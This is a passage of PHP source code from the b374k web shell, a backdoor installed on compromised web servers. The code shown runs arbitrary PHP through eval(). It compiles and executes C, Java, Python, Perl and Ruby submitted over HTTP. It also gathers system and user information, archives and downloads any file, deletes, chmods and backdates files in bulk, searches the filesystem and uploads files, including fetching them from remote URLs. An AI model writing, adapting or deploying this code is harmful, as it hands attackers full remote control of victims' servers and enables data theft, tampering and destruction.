			return $s_res['name'];
		}
	}
}
function sql_fetch_data($s_sqltype,$s_hasil){
	if($s_sqltype == 'mysql'){if(function_exists('mysql_fetch_row')) return mysql_fetch_row($s_hasil);}
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_fetch_row')) return mssql_fetch_row($s_hasil);
		elseif(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($s_hasil,1);
	}
	elseif($s_sqltype == 'pgsql'){if(function_exists('pg_fetch_row')) return pg_fetch_row($s_hasil);}
	elseif($s_sqltype == 'oracle'){if(function_exists('oci_fetch_row')) return oci_fetch_row($s_hasil);}
	elseif($s_sqltype == 'sqlite3'){if(class_exists('SQLite3')) return $s_hasil->fetchArray(1);}
	elseif($s_sqltype == 'sqlite'){if(function_exists('sqlite_fetch_array')) return sqlite_fetch_array($s_hasil,1);}
	elseif($s_sqltype == 'odbc'){if(function_exists('odbc_fetch_array')) return odbc_fetch_array($s_hasil);}
	elseif($s_sqltype == 'pdo'){if(class_exists('PDO')) return $s_hasil->fetch(2);}
}
function sql_num_rows($s_sqltype,$s_hasil){
	if($s_sqltype == 'mysql'){if(function_exists('mysql_num_rows')) return mysql_num_rows($s_hasil);}
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_num_rows')) return mssql_num_rows($s_hasil);
		elseif(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($s_hasil);
	}
	elseif($s_sqltype == 'pgsql'){if(function_exists('pg_num_rows')) return pg_num_rows($s_hasil);}
	elseif($s_sqltype == 'oracle'){if(function_exists('oci_num_rows')) return oci_num_rows($s_hasil);}
	elseif($s_sqltype == 'sqlite3'){
		if(class_exists('SQLite3')){
			$s_metadata = $s_hasil->fetchArray();
			if(is_array($s_metadata)) return $s_metadata['count'];
		}
	}
	elseif($s_sqltype == 'sqlite'){if(function_exists('sqlite_num_rows')) return sqlite_num_rows($s_hasil);}
	elseif($s_sqltype == 'odbc'){if(function_exists('odbc_num_rows')) return odbc_num_rows($s_hasil);}
	elseif($s_sqltype == 'pdo'){if(class_exists('PDO')) return $s_hasil->rowCount();}
}
function sql_close($s_sqltype,$s_con){
	if($s_sqltype == 'mysql'){if(function_exists('mysql_close')) return mysql_close($s_con);}
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_close')) return mssql_close($s_con);
		elseif(function_exists('sqlsrv_close')) return sqlsrv_close($s_con);
	}
	elseif($s_sqltype == 'pgsql'){if(function_exists('pg_close')) return pg_close($s_con);}
	elseif($s_sqltype == 'oracle'){if(function_exists('oci_close')) return oci_close($s_con);}
	elseif($s_sqltype == 'sqlite3'){if(class_exists('SQLite3')) return $s_con->close();}
	elseif($s_sqltype == 'sqlite'){if(function_exists('sqlite_close')) return sqlite_close($s_con);}
	elseif($s_sqltype == 'odbc'){if(function_exists('odbc_close')) return odbc_close($s_con);}
	elseif($s_sqltype == 'pdo'){if(class_exists('PDO')) return $s_con = null;}
}
if(!function_exists('str_split')){
	function str_split($s_t,$s_s=1){
		$s_a = array();
		for($s_i=0;$s_i<strlen($s_t);){
			$s_a[] = substr($s_t,$s_i,$s_s);
			$s_i += $s_s;
		}
		return $s_a;
	}
}

global $s_self;
$s_self = "?";

$s_cek1 = basename($_SERVER['SCRIPT_FILENAME']);
$s_cek2 = substr(basename(__FILE__),0,strlen($s_cek1));;

if(isset($_COOKIE['b374k_included'])){
	if(strcmp($s_cek1,$s_cek2)!=0) $s_self = $_COOKIE['s_self'];
	else{
		$s_self = "?";
		setcookie("b374k_included", "0" ,time() - $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
}
else{
	if(strcmp($s_cek1,$s_cek2)!=0){
		if(!isset($_COOKIE['s_home'])){
			$s_home = "?".$_SERVER["QUERY_STRING"]."&";
			setcookie("s_home", $s_home ,time() + $s_login_time);
		}
		if(isset($s_home)) $s_self = $s_home;
		elseif(isset($_COOKIE['s_home'])) $s_self = $_COOKIE['s_home'];
		setcookie("b374k_included", "1" ,time() + $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
	else{
		$s_self = "?";
		setcookie("b374k_included", "0" ,time() - $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
}

if($s_auth){
	// server software
	$s_software = getenv("SERVER_SOFTWARE");
	// uname -a
	$s_system = php_uname();
	// check os
	$s_win = (strtolower(substr($s_system,0,3)) == "win")? true : false;
	// change working directory
	if(isset($_REQUEST['cd'])){
		$s_dd = ss($_REQUEST['cd']);
		if(is_dir($s_dd)){
			$s_cwd = cp($s_dd);
			chdir($s_cwd);
			setcookie("cwd", $s_cwd ,time() + $s_login_time);
		}
	}
	else{
		if(isset($_COOKIE['cwd'])){
			$s_dd = ss($_COOKIE['cwd']);
			if(is_dir($s_dd)){
				$s_cwd = cp($s_dd);
				chdir($s_cwd);
			}
		}
		else $s_cwd = cp(getcwd());
	}
	// get path and all drives available
	$s_letters = '';
	if(!$s_win){
		if(!$s_user = rp(exe("whoami"))) $s_user = "";
		if(!$s_id = rp(exe("id"))) $s_id = "";
	}
	else {
		$s_user = get_current_user();
		$s_id = $s_user;
		// find drive letters
	 	$s_v = explode("\\",$s_cwd);
		$s_v = $s_v[0];
		foreach (range("A","Z") as $s_letter){
			if(is_dir($s_letter.":\\") && is_readable($s_letter.":\\")){
				$s_letters .= "<a href='".$s_self."cd=".$s_letter.":\\' onclick='return false;'>[ ";
				if ($s_letter.":" != $s_v) {$s_letters .= $s_letter;}
				else {$s_letters .= "<span style='color:#fff;'>".$s_letter."</span>";}
				$s_letters .= " ]</a> ";
			}
		}
	}
	// prompt style..
	$s_prompt = $s_user." &gt;";
	// check for posix
	$s_posix = (function_exists("posix_getpwuid") && function_exists("posix_getgrgid"))? true : false;
	// server ip
	$s_server_ip = gethostbyname($_SERVER["HTTP_HOST"]);
	// your ip ;-)
	$s_my_ip = $_SERVER['REMOTE_ADDR'];
	$s_result = "";

	global $s_python, $s_perl, $s_ruby, $s_gcc, $s_java, $s_tar;
	// check python
	if(isset($_COOKIE['s_python'])){$s_python = $_COOKIE['s_python'];}
	else{
		$s_python = check_access("python");
		setcookie("s_python", $s_python ,time() + $s_login_time);
	}
	$s_python = ($s_python=="1")?true:false;

	// check perl
	if(isset($_COOKIE['s_perl'])){$s_perl = $_COOKIE['s_perl'];}
	else{
		$s_perl = check_access("perl");
		setcookie("s_perl", $s_perl ,time() + $s_login_time);
	}
	$s_perl = ($s_perl=="1")?true:false;

	// check ruby
	if(isset($_COOKIE['s_ruby'])){$s_ruby = $_COOKIE['s_ruby'];}
	else{
		$s_ruby = check_access("ruby");
		setcookie("s_ruby", $s_ruby ,time() + $s_login_time);
	}
	$s_ruby = ($s_ruby=="1")?true:false;

	// check gcc
	if(isset($_COOKIE['s_gcc'])){$s_gcc = $_COOKIE['s_gcc'];}
	else{
		$s_gcc = check_access("gcc");
		setcookie("s_gcc", $s_gcc ,time() + $s_login_time);
	}
	$s_gcc = ($s_gcc=="1")?true:false;

	// check java
	if(isset($_COOKIE['s_java'])){$s_java = $_COOKIE['s_java'];}
	else{
		$s_java = check_access("java");
		setcookie("s_java", $s_java ,time() + $s_login_time);
	}
	$s_java = ($s_java=="1")?true:false;

	// check tar
	if(isset($_COOKIE['s_tar'])){$s_tar = $_COOKIE['s_tar'];}
	else{
		$s_tar = check_access("tar");
		setcookie("s_tar", $s_tar ,time() + $s_login_time);
	}
	$s_tar = ($s_tar=="1")?true:false;

	if(!empty($_REQUEST['dltype']) && !empty($_REQUEST['dlpath'])){
		$s_dltype = ss($_REQUEST['dltype']);
		$s_dlpath = ss($_REQUEST['dlpath']);

		$s_dlname = basename($s_dlpath);
		if($s_dlpath==".") $s_dlname=basename($s_cwd);
		elseif($s_dlpath==".."){
			chdir("..");
			$s_dlname=basename(getcwd());
			chdir($s_cwd);
		}
		$s_tmpdir = get_writabledir();
		$s_dlarchive = $s_tmpdir.$s_dlname;
		$s_dlthis = "";
		if($s_dltype=="ziparchive"){
			$s_dlarchive .= ".zip";
			if(zip($s_dlpath,$s_dlarchive)){
				$s_dlthis = $s_dlarchive;
			}
		}
		elseif($s_dltype=="tar"){
			$s_dlarchive .= ".tar";
			$s_dlarchive = str_replace('\\', '/', $s_dlarchive);
			exe("tar cf ".$s_dlarchive." ".$s_dlpath);
			$s_dlthis = $s_dlarchive;
		}
		elseif($s_dltype=="targz"){
			$s_dlarchive .= ".tar.gz";
			$s_dlarchive = str_replace('\\', '/', $s_dlarchive);
			exe("tar czf ".$s_dlarchive." ".$s_dlpath);
			$s_dlthis = $s_dlarchive;
		}
		elseif($s_dltype=="raw"){
			if(is_file($s_dlpath)) $s_dlthis = $s_dlpath;
		}

		if(is_file($s_dlthis)){
			header("Content-Type: application/octet-stream");
			header('Content-Transfer-Encoding: binary');
			header("Content-length: ".@filesize($s_dlthis));
			header("Content-disposition: attachment; filename=\"".basename($s_dlthis)."\";");
			$s_file = @fopen($s_dlthis,"rb");
			while(!feof($s_file)){
				print(@fread($s_file, 1024*8));
				ob_flush();
				flush();
			}
			fclose($s_file);

			if($s_dltype!="raw"){
				rename($s_dlthis,$s_dlthis."del");
				unlink($s_dlthis."del");
			}
			exit;
		}
	}
	// massact
	if(isset($_REQUEST['y'])){
		$s_massact = $_COOKIE['massact'];
		$s_buffer = rtrim(trim(urldecode($_COOKIE['buffer'])),"|");
		$s_lists = explode("|", $s_buffer);
		if(!empty($s_buffer)){
			if($_REQUEST['y']=='delete'){
				$s_result .= "<p class='notif'>Delete ? <a href='".$s_self."y=delok' onclick='return false;'>Yes</a> | <a href='".$s_self."' onclick='return false;'>No</a></p>";
				foreach($s_lists as $s_l) $s_result .= "<p class='notif'>".$s_l."</p>";
			}
			elseif($_REQUEST['y']=='chmod'){
				$s_result .= "<div class='notif'>chmod ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='0755' name='chmodok' style='width:30px;text-align:center;' maxlength='4' /><input class='inputzbut' type='submit' value='Go !' /></form></div>";
				foreach($s_lists as $s_l) $s_result .= "<p class='notif'>".$s_l."</p>";
			}
			elseif($_REQUEST['y']=='touch'){
				$s_result .= "<div class='notif'>touch ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='".date("d-M-Y H:i:s",time())."' name='touchok' style='width:130px;text-align:center;' /><input class='inputzbut' type='submit' value='Go !' /></form></div>";
				foreach($s_lists as $s_l) $s_result .= "<p class='notif'>".$s_l."</p>";
			}
			elseif($_REQUEST['y']=='paste' && $s_massact=='cut'){
				$s_result .= "<p class='notif'>Move here ? <a href='".$s_self."y=moveok' onclick='return false;'>Yes</a> | <a href='".$s_self."' onclick='return false;'>No</a></p>";
				foreach($s_lists as $s_l) $s_result .= "<p class='notif'>".$s_l."</p>";
			}
			elseif($_REQUEST['y']=='paste' && $s_massact=='copy'){
				$s_result .= "<p class='notif'>Copy here ? <a href='".$s_self."y=copyok' onclick='return false;'>Yes</a> | <a href='".$s_self."' onclick='return false;'>No</a></p>";
				foreach($s_lists as $s_l) $s_result .= "<p class='notif'>".$s_l."</p>";
			}
		}
	}

	if(isset($_REQUEST['y'])){
		$s_buffer = rtrim(trim(urldecode($_COOKIE['buffer'])),"|");
		$s_lists = explode("|", $s_buffer);
		$s_counter = 0;
		if($_REQUEST['y']=='moveok'){
			foreach($s_lists as $s_l){
				if(rename($s_l,$s_cwd.basename($s_l))) $s_counter++;
			}
			if($s_counter>0) $s_result .= "<p class='notif'>".$s_counter." files/folders moved</p>";
			else $s_result .= "<p class='notif'>no files/folders moved</p>";
			setcookie("buffer", "" ,time() - $s_login_time);
			setcookie("massact", "" ,time() - $s_login_time);
		}
		if($_REQUEST['y']=='copyok'){
			foreach($s_lists as $s_l){
				if(copy($s_l,$s_cwd.basename($s_l))) $s_counter++;
			}
			if($s_counter>0) $s_result .= "<p class='notif'>".$s_counter." files/folders copied</p>";
			else $s_result .= "<p class='notif'>no files/folders copied</p>";
			setcookie("buffer", "" ,time() - $s_login_time);
			setcookie("massact", "" ,time() - $s_login_time);
		}
		if($_REQUEST['y']=='delok'){
			foreach($s_lists as $s_l){
				if(is_file($s_l)){
					if(unlink($s_l)) $s_counter++;
				}
				elseif(is_dir($s_l)){
					rmdirs($s_l);
					if(!is_dir($s_l)) $s_counter++;
				}
			}
			if($s_counter>0) $s_result .= "<p class='notif'>".$s_counter." files/folders deleted</p>";
			else $s_result .= "<p class='notif'>no files/folders deleted</p>";
			setcookie("buffer", "" ,time() - $s_login_time);
			setcookie("massact", "" ,time() - $s_login_time);
		}
	}
	elseif(isset($_REQUEST['chmodok'])){
		$s_buffer = rtrim(trim(urldecode($_COOKIE['buffer'])),"|");
		$s_lists = explode("|", $s_buffer);
		$s_counter = 0;
		$s_mod = octdec($_REQUEST['chmodok']);
		foreach($s_lists as $s_l){
			if(chmod($s_l,$s_mod)) $s_counter++;
		}
		if($s_counter>0) $s_result .= "<p class='notif'>".$s_counter." files/folders changed mode to ".decoct($s_mod)."</p>";
		else $s_result .= "<p class='notif'>no files/folders modified</p>";
		setcookie("buffer", "" ,time() - $s_login_time);
		setcookie("massact", "" ,time() - $s_login_time);
	}
	elseif(isset($_REQUEST['touchok'])){
		$s_buffer = rtrim(trim(urldecode($_COOKIE['buffer'])),"|");
		$s_lists = explode("|", $s_buffer);
		$s_counter = 0;
		$s_datenew = strtotime($_REQUEST['touchok']);
		foreach($s_lists as $s_l){
			if(touch($s_l,$s_datenew)) $s_counter++;
		}
		if($s_counter>0) $s_result .= "<p class='notif'>".$s_counter." files/folders changed access and modification time to ".date("d-M-Y H:i:s",$s_datenew)."</p>";
		else $s_result .= "<p class='notif'>no files/folders modified</p>";
		setcookie("buffer", "" ,time() - $s_login_time);
		setcookie("massact", "" ,time() - $s_login_time);
	}

	// view image specified by ?img=<file>
	if(isset($_REQUEST['img'])){
		ob_clean();
		$s_d = ss($_REQUEST['d']);
		$s_f = ss($_REQUEST['img']);
		$s_inf = @getimagesize($s_d.$s_f);
		$s_ext = explode($s_f,".");
		$s_ext = $s_ext[count($s_ext)-1];
	 	header("Content-type: ".$s_inf["mime"]);
	 	header("Cache-control: public");
		header("Expires: ".@date("r",@mktime(0,0,0,1,1,2030)));
		header("Cache-control: max-age=".(60*60*24*7));#
	 	readfile($s_d.$s_f);
	 	exit;
	}

	// rename file or folder
	if(isset($_REQUEST['rename']) && isset($_REQUEST['oldname']) && isset($_REQUEST['newname'])){
		$s_old = ss($_REQUEST['oldname']);
		$s_new = ss($_REQUEST['newname']);

		$s_renmsg = "";
		if(is_dir($s_old)) $s_renmsg = (@rename($s_cwd.$s_old,$s_cwd.$s_new)) ? "Directory ".$s_old." renamed to ".$s_new : "Unable to rename directory ".$s_old." to ".$s_new;
		elseif(is_file($s_old)) $s_renmsg = (@rename($s_cwd.$s_old,$s_cwd.$s_new)) ? "File ".$s_old." renamed to ".$s_new : "Unable to rename file ".$s_old." to ".$s_new;
		else $s_renmsg = "Cannot find the path specified ".$s_old;

		$s_result .= "<p class='notif'>".$s_renmsg."</p>";
		$s_fnew = $s_cwd.$s_new;
	}

	// confirm delete
	if(!empty($_REQUEST['del'])){
		$s_del = trim($_REQUEST['del']);
		$s_result .= "<p class='notif'>Delete ".basename($s_del)." ? <a href='".$s_self."delete=".$s_del."' onclick='return false;'>Yes</a> | <a href='".$s_self."' onclick='return false;'>No</a></p>";
	}// delete file
	elseif(!empty($_REQUEST['delete'])){
		$s_f = ss($_REQUEST['delete']);
		$s_delmsg = "";
		if(is_file($s_f)){
			$s_delmsg = (unlink($s_f)) ? "File removed : ".$s_f : "Unable to remove file ".$s_f;
		}
		elseif(is_dir($s_f)){
			rmdirs($s_f);
			$s_delmsg = (is_dir($s_f)) ? "Unable to remove directory ".$s_f : "Directory removed : ".$s_f;
		}
		else $s_delmsg = "Cannot find the path specified ".$s_f;
		$s_result .= "<p class='notif'>".$s_delmsg."</p>";
	} // create dir
	elseif(!empty($_REQUEST['mkdir'])){
		$s_f = ss($s_cwd.ss($_REQUEST['mkdir']));
		$s_dirmsg = "";

		$s_num = 1;
		if(is_dir($s_f)){
			$s_pos = strrpos($s_f,"_");
			if($s_pos!==false) $s_num = (int) substr($s_f,$s_pos+1);
			while(is_dir(substr($s_f,0,$s_pos)."_".$s_num)){
				$s_num++;
			}
			$s_f = substr($s_f,0,$s_pos)."_".$s_num;
		}
		if(mkdir($s_f)) $s_dirmsg = "Directory created ".$s_f;
		else $s_dirmsg = "Unable to create directory ".$s_f;

		$s_result .= "<p class='notif'>".$s_dirmsg."</p>";
	}

	// php eval() function
	if(isset($_REQUEST['x']) && ($_REQUEST['x']=='eval')){
		$s_code = "";
		$s_res = "";
		$s_gccoption = "";
		$s_lang = "php";

		if(isset($_REQUEST['evalcode'])){
			$s_code = ssc($_REQUEST['evalcode']);
			$s_gccoption = (isset($_REQUEST['gccoption']))? " ".ssc($_REQUEST['gccoption']):"";
			$s_tmpdir = get_writabledir();

			if(isset($_REQUEST['lang'])){$s_lang = $_REQUEST['lang'];}

			if(strtolower($s_lang)=='php'){
				ob_start();
				eval($s_code);
				$s_res = ob_get_contents();
				ob_end_clean();
			}
			elseif(strtolower($s_lang)=='python'||strtolower($s_lang)=='perl'||strtolower($s_lang)=='ruby'){
				$s_rand = md5(time().rand(0,100));
				$s_script = $s_tmpdir.$s_rand;
				file_put_contents($s_script, $s_code);
				if(is_file($s_script)){
					$s_res = exe($s_lang." ".$s_script.$s_gccoption);
					unlink($s_script);
				}
			}
			elseif(strtolower($s_lang)=='gcc'){
				$s_script = md5(time().rand(0,100));
				chdir($s_tmpdir);
				file_put_contents($s_script.".c", $s_code);
				if(is_file($s_script.".c")){
					$s_scriptout = $s_win ? $s_script.".exe" : $s_script;
					$s_res = exe("gcc ".$s_script.".c -o ".$s_scriptout.$s_gccoption);
					if(is_file($s_scriptout)){
						$s_res = $s_win ? exe($s_scriptout) : exe("chmod +x ".$s_scriptout." ; ./".$s_scriptout);
						rename($s_scriptout, $s_scriptout."del");
						unlink($s_scriptout."del");
					}
					unlink($s_script.".c");
				}
				chdir($s_cwd);
			}
			elseif(strtolower($s_lang)=='java'){
				if(preg_match("/class\ ([^{]+){/i",$s_code, $s_r)){
					$s_classname = trim($s_r[1]);
					$s_script = $s_classname;
				}
				else{
					$s_rand = "b374k_".substr(md5(time().rand(0,100)),0,8);
					$s_script = $s_rand;
					$s_code = "class ".$s_rand." { ".$s_code . " } ";
				}
				chdir($s_tmpdir);
				file_put_contents($s_script.".java", $s_code);
				if(is_file($s_script.".java")){
					$s_res = exe("javac ".$s_script.".java");
					if(is_file($s_script.".class")){
						$s_res .= exe("java ".$s_script.$s_gccoption);
						unlink($s_script.".class");
					}
					unlink($s_script.".java");
				}
				chdir($s_pwd);
			}
		}

		$s_lang_available = "<option value='php'>php</option>";
		$s_selected = "";
		if($s_python){
			$s_checked = ($s_lang == "python") ? "selected" : "";
			$s_lang_available .= "<option value='python' ".$s_checked.">python</option>";
		}
		if($s_perl){
			$s_checked = ($s_lang == "perl") ? "selected" : "";
			$s_lang_available .= "<option value='perl' ".$s_checked.">perl</option>";
		}
		if($s_ruby){
			$s_checked = ($s_lang == "ruby") ? "selected" : "";
			$s_lang_available .= "<option value='ruby' ".$s_checked.">ruby</option>";
		}
		if($s_gcc){
			$s_checked = ($s_lang == "gcc") ? "selected" : "";
			$s_lang_available .= "<option value='gcc' ".$s_checked.">c</option>";
		}
		if($s_java){
			$s_checked = ($s_lang == "java") ? "selected" : "";
			$s_lang_available .= "<option value='java' ".$s_checked.">java</option>";
		}
		$s_gccoptionclass = ($s_lang=="php")? "sembunyi":"";
		$s_e_result = (!empty($s_res)) ? "<pre id='evalres' style='border-top:1px solid #393939;margin:4px 0 0 0;padding:6px 0;' >".hss($s_res)."</pre>":"";
		$s_result .= "<form action='".$s_self."' method='post'>
					<textarea id='evalcode' name='evalcode' style='height:150px;' class='txtarea'>".hss($s_code)."</textarea>
					<table><tr><td style='padding:0;'><p><input type='submit' name='evalcodesubmit' class='inputzbut' value='Go !' style='width:120px;height:30px;' /></p>
					</td><td><select name='lang' onchange='evalselect(this);' class='inputzbut' style='width:120px;height:30px;padding:4px;'>
					".$s_lang_available."
					</select>
					</td>
					<td><div id='additionaloption' class='".$s_gccoptionclass."'>Additional option<input class='inputz' style='width:400px;' type='text' name='gccoption' value='".hss($s_gccoption)."' title='If you want to give additional option to interpreter or compiler, give it here' id='gccoption' /></div></td>
					</tr>
					</table>
					".$s_e_result."
					<input type='hidden' name='x' value='eval' />
					</form>
					";
	}
	// find
	elseif(isset($_REQUEST['find'])){
		$s_p = cp($_REQUEST['find']);

		$s_type = isset($_REQUEST['type']) ? $_REQUEST['type'] : "sfile";
		$s_sfname = (!empty($_REQUEST['sfname']))?ssc($_REQUEST['sfname']):'';
		$s_sdname = (!empty($_REQUEST['sdname']))?ssc($_REQUEST['sdname']):'';
		$s_sfcontain = (!empty($_REQUEST['sfcontain']))?ssc($_REQUEST['sfcontain']):'';

		$s_sfnameregexchecked=$s_sfnameicasechecked=$s_sdnameregexchecked=$s_sdnameicasechecked=$s_sfcontainregexchecked=$s_sfcontainicasechecked=$s_swritablechecked=$s_sreadablechecked=$s_sexecutablechecked="";
		$s_sfnameregex=$s_sfnameicase=$s_sdnameregex=$s_sdnameicase=$s_sfcontainregex=$s_sfcontainicase=$s_swritable=$s_sreadable=$s_sexecutable=false;

		if(isset($_REQUEST['sfnameregex'])){$s_sfnameregex=true;$s_sfnameregexchecked="checked";}
		if(isset($_REQUEST['sfnameicase'])){$s_sfnameicase=true;$s_sfnameicasechecked="checked";}
		if(isset($_REQUEST['sdnameregex'])){$s_sdnameregex=true;$s_sdnameregexchecked="checked";}
		if(isset($_REQUEST['sdnameicase'])){$s_sdnameicase=true;$s_sdnameicasechecked="checked";}
		if(isset($_REQUEST['sfcontainregex'])){$s_sfcontainregex=true;$s_sfcontainregexchecked="checked";}
		if(isset($_REQUEST['sfcontainicase'])){$s_sfcontainicase=true;$s_sfcontainicasechecked="checked";}
		if(isset($_REQUEST['swritable'])){$s_swritable=true;$s_swritablechecked="checked";}
		if(isset($_REQUEST['sreadable'])){$s_sreadable=true;$s_sreadablechecked="checked";}
		if(isset($_REQUEST['sexecutable'])){$s_sexecutable=true;$s_sexecutablechecked="checked";}

		$s_sexecb = (function_exists("is_executable")) ? "<input class='css-checkbox' type='checkbox' name='sexecutable' value='sexecutable' id='se' ".$s_sexecutablechecked." /><label class='css-label' for='se'>Executable</span>":"";

		$s_candidate = array();
		if(isset($_REQUEST['sgo'])){
			$s_af = "";

			$s_candidate = getallfiles($s_p);
			if($s_type=='sfile') $s_candidate = array_filter($s_candidate, "is_file");
			elseif($s_type=='sdir') $s_candidate = array_filter($s_candidate, "is_dir");

			foreach($s_candidate as $s_a){
				if($s_type=='sdir'){
					if(!empty($s_sdname)){
						if($s_sdnameregex){
							if($s_sdnameicase){if(!preg_match("/".$s_sdname."/i", basename($s_a))) $s_candidate = array_diff($s_candidate,array($s_a));}
							else{if(!preg_match("/".$s_sdname."/", basename($s_a))) $s_candidate = array_diff($s_candidate,array($s_a));}
						}
						else{
							if($s_sdnameicase){if(strpos(strtolower(basename($s_a)),strtolower($s_sdname))===false) $s_candidate = array_diff($s_candidate,array($s_a));}
							else{if(strpos(basename($s_a),$s_sdname)===false) $s_candidate = array_diff($s_candidate,array($s_a));}
						}
					}
				}
				elseif($s_type=='sfile'){
					if(!empty($s_sfname)){
						if($s_sfnameregex){
							if($s_sfnameicase){if(!preg_match("/".$s_sfname."/i", basename($s_a))) $s_candidate = array_diff($s_candidate,array($s_a));}
							else{if(!preg_match("/".$s_sfname."/", basename($s_a))) $s_candidate = array_diff($s_candidate,array($s_a));}
						}
						else{
							if($s_sfnameicase){if(strpos(strtolower(basename($s_a)),strtolower($s_sfname))===false) $s_candidate = array_diff($s_candidate,array($s_a));}
							else{if(strpos(basename($s_a),$s_sfname)===false) $s_candidate = array_diff($s_candidate,array($s_a));}
						}
					}
					if(!empty($s_sfcontain)){
						$s_sffcontent = @file_get_contents($s_a);
						if($s_sfcontainregex){
							if($s_sfcontainicase){if(!preg_match("/".$s_sfcontain."/i", $s_sffcontent)) $s_candidate = array_diff($s_candidate,array($s_a));}
							else{if(!preg_match("/".$s_sfcontain."/",  $s_sffcontent)) $s_candidate = array_diff($s_candidate,array($s_a));}
						}
						else{
							if($s_sfcontainicase){if(strpos(strtolower($s_sffcontent),strtolower($s_sfcontain))===false) $s_candidate = array_diff($s_candidate,array($s_a));}
							else{if(strpos($s_sffcontent,$s_sfcontain)===false) $s_candidate = array_diff($s_candidate,array($s_a));}
						}
					}
				}
			}
		}

		$s_f_result = "";$s_link="";
		foreach($s_candidate as $s_c){
			$s_c=trim($s_c);
			if($s_swritable && !is_writable($s_c)) continue;
			if($s_sreadable && !is_readable($s_c)) continue;
			if($s_sexecutable && !is_executable($s_c)) continue;
			if($s_type=="sfile") $s_link = $s_self."cd=".cp(dirname($s_c))."&view=".basename($s_c);
			elseif($s_type=="sdir") $s_link = $s_self."cd=".cp($s_c);
			$s_f_result .= "<p class='notif' ondblclick=\"return go('".addslashes($s_link)."',event);\"><a href='".$s_link."' onclick='return false;'>".$s_c."</a></p>";
		}

		$s_tsdir = ($s_type=="sdir")? "selected":"";
		$s_tsfile = ($s_type=="sfile")? "selected":"";

		if(!is_dir($s_p)) $s_result .= "<p class='notif'>Cannot find the path specified ".$s_p."</p>";
		$s_result .= "<form action='".$s_self."' method='post'>
		<div class='mybox'><h2>Find</h2>
		<table class='myboxtbl'>
		<tr><td style='width:140px;'>Search in</td>
		<td colspan='2'><input style='width:100%;' value='".hss($s_p)."' class='inputz' type='text' name='find' /></td></tr>
		<tr onclick=\"findtype('sdir');\">
			<td>Dirname contains</td>
			<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sdname' value='".hss($s_sdname)."' /></td>
			<td>
				<input type='checkbox' class='css-checkbox' name='sdnameregex' id='sdn' ".$s_sdnameregexchecked." /><label class='css-label' for='sdn'>Regex (pcre)</label>
				<input type='checkbox' class='css-checkbox' name='sdnameicase' id='sdi' ".$s_sdnameicasechecked." /><label class='css-label' for='sdi'>Case Insensitive</label>
			</td>
		</tr>
		<tr onclick=\"findtype('sfile');\">
			<td>Filename contains</td>
			<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sfname' value='".hss($s_sfname)."' /></td>
			<td>
				<input type='checkbox' class='css-checkbox' name='sfnameregex'  id='sfn' ".$s_sfnameregexchecked." /><label class='css-label' for='sfn'>Regex (pcre)</label>
				<input type='checkbox' class='css-checkbox' name='sfnameicase'  id='sfi' ".$s_sfnameicasechecked." /><label class='css-label' for='sfi'>Case Insensitive</label>
			</td>
		</tr>
		<tr onclick=\"findtype('sfile');\">
			<td>File contains</td>
			<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sfcontain' value='".hss($s_sfcontain)."' /></td>
			<td>
				<input type='checkbox' class='css-checkbox' name='sfcontainregex' id='sff' ".$s_sfcontainregexchecked." /><label class='css-label' for='sff'>Regex (pcre)</label>
				<input type='checkbox' class='css-checkbox' name='sfcontainicase' id='sffi' ".$s_sfcontainicasechecked." /><label class='css-label' for='sffi'>Case Insensitive</label>
			</td>
		</tr>
		<tr>
			<td>Permissions</td>
			<td colspan='2'>
				<input type='checkbox' class='css-checkbox' name='swritable' id='sw' ".$s_swritablechecked." /><label class='css-label' for='sw'>Writable</label>
				<input type='checkbox' class='css-checkbox' name='sreadable' id='sr' ".$s_sreadablechecked." /><label class='css-label' for='sr'>Readable</label>
				".$s_sexecb."
			</td>
		</tr>
		<tr><td>
		<input type='submit' name='sgo' class='inputzbut' value='Search !' style='width:120px;height:30px;margin:0;' />
		</td>
		<td>
		<select name='type' id='type' class='inputzbut' style='width:120px;height:30px;margin:0;padding:4px;'>
			<option value='sfile' ".$s_tsfile.">Search file</option>
			<option value='sdir' ".$s_tsdir.">Search dir</option>
		</select>
		</td>
		<td></td></tr>
		</table>
		</div>
		</form>
		<div>
		".$s_f_result."
		</div>
		";
	}
	// upload !
	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='upload')){
		$s_result = " ";
		$s_msg = "";
		if(isset($_REQUEST['uploadhd'])){
			$s_fn = $_FILES['filepath']['name'];
			if(is_uploaded_file($_FILES['filepath']['tmp_name'])){
				$s_p = cp(ss($_REQUEST['savefolder']));
				if(!is_dir($s_p)) $s_p = cp(dirname($s_p));
				if(isset($_REQUEST['savefilename']) && (trim($_REQUEST['savefilename'])!="")) $s_fn = ss($_REQUEST['savefilename']);
				$s_tm = $_FILES['filepath']['tmp_name'];
				$s_pi = cp($s_p).$s_fn;
				$s_st = @move_uploaded_file($s_tm,$s_pi);
				if($s_st)	$s_msg = "<p class='notif'>File uploaded to <a href='".$s_self."view=".basename($s_pi)."' onclick='return false;'>".$s_pi."</a></p>";
				else $s_msg = "<p class='notif'>Failed to upload ".$s_fn."</p>";
			}
			else $s_msg = "<p class='notif'>Failed to upload ".$s_fn."</p>";
		}
		elseif(isset($_REQUEST['uploadurl'])){
			// function dlfile($s_url,$s_fpath){
			$s_p = cp(ss($_REQUEST['savefolderurl']));
			if(!is_dir($s_p)) $s_p = cp(dirname($s_p));
			$s_fu = ss($_REQUEST['fileurl']);
			$s_fn = basename($s_fu);
			if(isset($_REQUEST['savefilenameurl']) && (trim($_REQUEST['savefilenameurl'])!="")) $s_fn = ss($_REQUEST['savefilenameurl']);
			$s_fp = cp($s_p).$s_fn;
			$s_st = dlfile($s_fu,$s_fp);
			if($s_st) $s_msg = "<p class='notif'>File uploaded to <a href='".$s_self."view=".basename($s_fp)."' onclick='return false;'>".$s_fp."</a></p>";
